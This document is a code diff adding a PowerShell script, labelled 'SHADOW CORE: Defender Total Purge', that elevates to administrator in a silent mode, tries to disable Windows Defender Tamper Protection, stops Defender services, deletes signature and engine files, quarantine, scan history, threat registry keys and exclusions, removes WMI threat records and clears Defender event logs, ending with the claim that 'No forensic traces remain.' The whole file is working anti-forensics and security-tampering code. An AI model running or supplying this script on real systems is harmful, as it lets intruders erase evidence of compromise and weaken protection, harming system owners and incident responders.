@@ -1,0 +1,212 @@
+# ------------------------------------------------------------
+# 0. Force Admin Elevation + Stealth Mode
+# ------------------------------------------------------------
+param([switch]$ForceAdmin, [switch]$Silent)
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    if ($ForceAdmin -and $PSCommandPath) {
+        if (-not $Silent) { Write-Host "[!] Elevating..." -ForegroundColor Yellow }
+        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ForceAdmin -Silent" -Verb RunAs
+        exit
+    } else {
+        Write-Host "[ERROR] Administrator required." -ForegroundColor Red
+        if (-not $PSCommandPath) { Write-Host "      (Running via IEX? Start PowerShell as Administrator manually.)" -ForegroundColor Yellow }
+        exit 1
+    }
+}
+
+if (-not $Silent) { Write-Host "[*] SHADOW CORE: Defender Total Purge Initiated" -ForegroundColor Cyan }
+
+# ------------------------------------------------------------
+# 1. Stop & Disable Tamper Protection (if Windows 10/11)
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Disabling Tamper Protection..." -ForegroundColor Cyan }
+$tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
+if (Test-Path $tamperKey) {
+    Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $tamperKey -Name "DisableAntiSpyware" -Value 0 -Force -ErrorAction SilentlyContinue
+}
+
+# Stop services
+$defenderServices = @("WinDefend", "Sense", "WdNisSvc", "MsMpSvc", "WdFilter")
+foreach ($service in $defenderServices) {
+    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+        Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
+        Set-Service -Name $service -StartupType Manual -ErrorAction SilentlyContinue
+    }
+}
+
+# ------------------------------------------------------------
+# 2. NUKE .DAT & BINARY CACHES (FIXED NULL PATH HANDLING)
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Hunting and destroying .dat/.vdm/.vdl/.bin files..." -ForegroundColor Cyan }
+$datPatterns = @("*.dat", "*.vdm", "*.vdl", "*.bin", "*.db", "*.db-wal", "*.db-shm", "*.cache", "*.log")
+$defenderDirs = @(
+    "$env:ProgramData\Microsoft\Windows Defender",
+    "$env:ProgramData\Microsoft\Microsoft Antimalware",
+    "$env:ProgramData\Microsoft\Windows Defender Advanced Threat Protection",
+    "$env:SystemRoot\System32\GroupPolicy\Machine\Microsoft\Windows Defender",
+    "$env:SystemRoot\System32\Microsoft\Windows Defender\Data",
+    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules\Defender"
+)
+
+foreach ($dir in $defenderDirs) {
+    if (Test-Path $dir) {
+        foreach ($pattern in $datPatterns) {
+            $files = Get-ChildItem -Path $dir -Recurse -Include $pattern -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                if ($file -ne $null -and $file.FullName) {
+                    try {
+                        Remove-Item -Path $file.FullName -Force -ErrorAction Stop
+                        if (-not $Silent) { Write-Host "    [DAT DELETE] $($file.FullName)" -ForegroundColor DarkGray }
+                    } catch {
+                        # Attempt to take ownership and delete
+                        takeown.exe /f $file.FullName /a 2>$null
+                        icacls.exe $file.FullName /grant administrators:F /T /C /Q 2>$null
+                        Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+        }
+    }
+}
+
+# ------------------------------------------------------------
+# 3. WIPE DataStore & MpEngine Persistent Files
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Purging MpEngine DataStore..." -ForegroundColor Cyan }
+$mpEnginePaths = @(
+    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\DataStore",
+    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*",
+    "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*",
+    "$env:ProgramData\Microsoft\Windows Defender\Support\MpLog*.dat",
+    "$env:ProgramData\Microsoft\Windows Defender\Nis\*.dat"
+)
+
+foreach ($path in $mpEnginePaths) {
+    if (Test-Path $path) {
+        Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_ -ne $null -and $_.FullName) {
+                Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+}
+
+# Force-delete MpEnginedb.dat and MpSigDwn.dat
+$criticalDatFiles = @(
+    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*\MpEnginedb.dat",
+    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*\MpSigDwn.dat",
+    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\MpEngine.db",
+    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\MpAvDta.dat"
+)
+
+foreach ($file in $criticalDatFiles) {
+    if ($file -ne $null -and (Test-Path $file)) {
+        takeown.exe /f $file /a 2>$null
+        icacls.exe $file /grant administrators:F 2>$null
+        Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+        if (-not $Silent) { Write-Host "    [ENGINE PURGE] $file" -ForegroundColor DarkRed }
+    }
+}
+
+# ------------------------------------------------------------
+# 4. Purge Threat History via WMI
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Clearing WMI threat objects..." -ForegroundColor Cyan }
+Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreat" | Remove-WmiObject -ErrorAction SilentlyContinue
+Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreatDetection" | Remove-WmiObject -ErrorAction SilentlyContinue
+Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpScan" | Remove-WmiObject -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------
+# 5. Delete Quarantine & History Folders (Recursive)
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Obliterating quarantine and history..." -ForegroundColor Cyan }
+$paths = @(
+    "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
+    "$env:ProgramData\Microsoft\Windows Defender\Support",
+    "$env:ProgramData\Microsoft\Windows Defender\Scans",
+    "$env:ProgramData\Microsoft\Windows Defender\ThreatServiceLogs",
+    "$env:ProgramData\Microsoft\Windows Defender\Threats",
+    "$env:ProgramData\Microsoft\Windows Defender\Reporting",
+    "$env:ProgramData\Microsoft\Windows Defender\Nis",
+    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\Logs",
+    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\Data"
+)
+
+foreach ($path in $paths) {
+    if ($path -ne $null -and (Test-Path $path)) {
+        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# ------------------------------------------------------------
+# 6. Clear Registry Artifacts
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Scrubbing registry..." -ForegroundColor Cyan }
+$regPaths = @(
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Threats",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Health",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Quarantine",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Scans",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Data",
+    "HKCU:\SOFTWARE\Microsoft\Windows Defender\Exclusions"
+)
+
+foreach ($reg in $regPaths) {
+    if ($reg -ne $null -and (Test-Path $reg)) {
+        Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# ------------------------------------------------------------
+# 7. Use MpCmdRun to Reset Signatures & Reporting
+# ------------------------------------------------------------
+$mpcmd = "$env:ProgramFiles\Windows Defender\MpCmdRun.exe"
+if (Test-Path $mpcmd) {
+    if (-not $Silent) { Write-Host "[*] Forcing Defender cache reset via MpCmdRun..." -ForegroundColor Cyan }
+    Start-Process -FilePath $mpcmd -ArgumentList "-RemoveDefinitions -All" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Start-Process -FilePath $mpcmd -ArgumentList "-SignatureUpdate -Force" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Start-Process -FilePath $mpcmd -ArgumentList "-RestoreDefaults" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+}
+
+# ------------------------------------------------------------
+# 8. Reset Event Logs
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Purging event logs..." -ForegroundColor Cyan }
+$logs = @("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender/WHC", "Microsoft-Windows-Windows Defender/ThreatTrack")
+foreach ($log in $logs) {
+    wevtutil.exe clear-log $log 2>$null
+}
+
+# ------------------------------------------------------------
+# 9. Restart Services & Re-enable Protection
+# ------------------------------------------------------------
+if (-not $Silent) { Write-Host "[*] Restarting services..." -ForegroundColor Cyan }
+foreach ($service in $defenderServices) {
+    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+        Set-Service -Name $service -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name $service -ErrorAction SilentlyContinue
+    }
+}
+
+# Re-enable Tamper Protection if needed
+if (Test-Path $tamperKey) {
+    Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 4 -Force -ErrorAction SilentlyContinue
+}
+
+# ------------------------------------------------------------
+# 10. Final Verification
+# ------------------------------------------------------------
+if (-not $Silent) {
+    Write-Host "`n[✓] TOTAL PURGE COMPLETE." -ForegroundColor Green
+    Write-Host "  - .DAT/.VDM/.VDL/.BIN files: Annihilated" -ForegroundColor Gray
+    Write-Host "  - MpEngine DataStore: Wiped" -ForegroundColor Gray
+    Write-Host "  - Quarantine/History/Scans: Erased" -ForegroundColor Gray
+    Write-Host "  - Registry: Scrubbed" -ForegroundColor Gray
+    Write-Host "  - Signatures: Forced refresh" -ForegroundColor Gray
+    Write-Host "`n[!] Defender will redownload clean signatures. No forensic traces remain." -ForegroundColor Yellow
+}
+
+exit 0
